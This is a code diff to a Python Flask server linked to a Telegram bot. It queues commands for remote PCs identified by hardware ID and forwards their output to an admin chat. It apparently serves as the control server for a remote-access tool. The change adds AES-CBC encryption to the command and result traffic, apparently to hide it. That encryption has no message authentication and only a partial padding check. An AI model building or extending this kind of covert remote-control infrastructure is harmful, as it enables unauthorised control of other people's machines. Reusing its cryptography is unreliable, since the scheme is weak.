@@ -82,6 +82,53 @@ class Settings:
 settings = Settings()
 settings.upload_dir.mkdir(parents=True, exist_ok=True)
 
+import base64
+import json
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+
+# Derive 256-bit key from API_KEY via SHA-256 (exactly matches C++ side)
+_aes_key = hashlib.sha256(settings.api_key.encode("utf-8")).digest()
+
+def encrypt_payload(plaintext: str) -> str:
+    try:
+        iv = os.urandom(16)
+        # Standard PKCS7 padding
+        pad_len = 16 - (len(plaintext.encode("utf-8")) % 16)
+        padded_data = plaintext.encode("utf-8") + bytes([pad_len] * pad_len)
+        
+        cipher = Cipher(algorithms.AES(_aes_key), modes.CBC(iv), backend=default_backend())
+        encryptor = cipher.encryptor()
+        ciphertext = encryptor.update(padded_data) + encryptor.finalize()
+        
+        # Combined IV + ciphertext
+        combined = iv + ciphertext
+        return base64.b64encode(combined).decode("utf-8")
+    except Exception:
+        logger.exception("Failed to encrypt payload")
+        return ""
+
+def decrypt_payload(ciphertext_b64: str) -> str:
+    try:
+        combined = base64.b64decode(ciphertext_b64)
+        if len(combined) < 32:
+            return ""
+        iv = combined[:16]
+        ciphertext = combined[16:]
+        
+        cipher = Cipher(algorithms.AES(_aes_key), modes.CBC(iv), backend=default_backend())
+        decryptor = cipher.decryptor()
+        padded_data = decryptor.update(ciphertext) + decryptor.finalize()
+        
+        # Standard PKCS7 unpadding
+        pad_len = padded_data[-1]
+        if pad_len < 1 or pad_len > 16:
+            return ""
+        return padded_data[:-pad_len].decode("utf-8")
+    except Exception:
+        logger.exception("Failed to decrypt payload")
+        return ""
+
 bot = telebot.TeleBot(settings.bot_token, threaded=False)
 app = Flask(__name__)
 app.config["MAX_CONTENT_LENGTH"] = settings.max_upload_mb * 1024 * 1024
@@ -349,7 +396,9 @@ def poll():
     require_api_key()
     hwid = request.args.get("hwid", "Default-PC")
     pc_last_seen[hwid] = utc_now()
-    return jsonify({"commands": drain_commands(hwid)})
+    cmds = drain_commands(hwid)
+    payload_json = json.dumps({"commands": cmds})
+    return encrypt_payload(payload_json)
 
 
 @app.post("/api/result")
@@ -358,7 +407,10 @@ def result():
     hwid = request.args.get("hwid", "Default-PC")
     prefix = f"🖥️ [{hwid}]:\n"
     try:
-        send_chunks(settings.admin_id, prefix + request_text())
+        raw_text = request_text()
+        decrypted = decrypt_payload(raw_text)
+        text_to_send = decrypted if decrypted else raw_text
+        send_chunks(settings.admin_id, prefix + text_to_send)
     except Exception:
         logger.exception("Failed to forward result to Telegram")
     return jsonify({"ok": True})
